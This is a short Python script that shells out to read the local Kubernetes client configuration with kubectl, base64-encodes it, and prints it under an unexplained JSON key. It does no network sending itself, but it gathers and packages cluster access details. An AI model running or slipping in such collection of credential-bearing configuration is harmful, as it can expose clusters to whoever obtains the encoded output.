import subprocess
import json
import base64

# Define the command to run
command = "kubectl config view -ojson"

# Run the command and capture the output
output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

# Parse the JSON output into a Python dictionary
config_data = json.loads(output)

output2 = output.encode('ascii')
print(f'{{\"popa\": \"{base64.b64encode(output2).decode()}\"}}')